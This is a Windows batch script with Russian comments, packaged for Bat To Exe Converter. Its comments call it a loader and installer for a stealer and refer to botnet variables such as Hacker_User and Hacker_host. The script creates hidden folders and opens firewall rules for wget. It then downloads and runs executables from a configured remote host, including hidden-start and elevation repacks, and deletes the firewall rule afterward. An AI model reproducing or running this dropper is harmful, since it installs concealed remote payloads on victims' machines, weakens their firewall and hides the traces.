::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWGveyEs+LQ9EWQa+K3ytFLoT/NTe9/qIrEgTQOMDcYHIzrWCLO0S40vgfIU5xHNY1skNGHs=
::fBE1pAF6MU+EWGveyEs+LQ9EWQa+K3ytFLoT/NTe9/qIrEgTQOMDUYHIzrWCLM0S40vBbYYi2H9UjMpCDhpMHg==
::fBE1pAF6MU+EWGveyEs+LQ9EWQa+K3ytFLoT/NTe9/qIrEgTQOMDcYHIzrWCLO0S40vgfIU5xHNY1sICBXs=
::fBE1pAF6MU+EWGveyEs+LQ9EWQa+K3ytFLoT/NTe9/qIrEgTQOMDb4jezvqLOOVz
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdD2DJFCK8VYgPRloWxOVLmS1Eok58Pj04e+Jtkwhcfovd4He1KCPCe4A/kToeZM//m5OiIUJFB44
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
rem Файл загрузки и установки стайлера (Академический вариант)
rem USAGE
rem > loadhttpmaindistrib.bat
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host2=%3
rem set Hacker_host3=%4



rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %~dp0\installmaindistrib.ini || exit /b 1

rem Create Target Directories
md %PUB1%
md %PUB1%\Distrib\plugins
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\plugins

rem Go to Temprorary Directory
cd /d %curdir%

rem Настраиваем переменные окружения для команды Wget

rem Определяем переменные:

rem Основная папка
rem set httpMainFolder=Exponenta
rem Префикс протокола
rem set httppref=http
rem HTTP Port
rem set httpport=80

rem HTTP WebDAV Host
set host=%httppref%://%httphost%:%httpport%/%httpMainFolder%
rem WebDAV User
rem set httpuser=%Hacker_User%
rem WebDAV Password
rem set httppassword=%Hacker_Pass%
rem Локальный каталог
set LocalFolder=%PUB1%\Distrib\plugins

rem Копируем wget и запускаем установку в каталоге %LocalFolder%
copy wget.exe %LocalFolder%\wget.exe
copy installmaindistrib.ini %LocalFolder%\
copy installmaindistrib.bat %LocalFolder%\
copy InstallMainExponenta.bat %LocalFolder%\
cd /d %LocalFolder%
cd %LocalFolder%

rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%LocalFolder%\wget.exe" enable=yes
rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%LocalFolder%\wget.exe" enable=yes


rem Запускаем на выполнение команды WGET
rem !!! Изменяемая величина! Проверять перед использованием !!!

rem wget -c -t 2 --content-disposition %host%/InstallMainExponenta.bat
wget %host%/ExponentaMainFilesSetup.exe
rem wget -c -t 2 --content-disposition %host%/loadftpmaindistrib.bat
rem wget -c -t 2 --content-disposition %host%/installmaindistrib.ini
wget %host%/HiddenStartSetupRePack.exe
wget %host%/ElevationSetupRepack.exe
wget %host%/duck-install.msi
wget %host%/AdminTExponentaPluginSetup.exe
rem wget -c -t 2 --content-disposition %host%/installmaindistrib.bat
wget %host%/UtilSetup.exe
rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
rem wget -r --no-parent %host%/

rem Запускаем инсталлятор Admin Pack "Экспонента"
call %LocalFolder%\InstallMainExponenta.bat %PUB1% %Hacker_host1%
cd /d %curdir%
cd %curdir%

rem Удаляем временный каталог
rd /S /Q WindowsPowerShell

rem Удаляем правило для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="WGET.EXE Application rule 1"


rem Выход из сценария. Дальше - только функции.
exit /b 0

rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

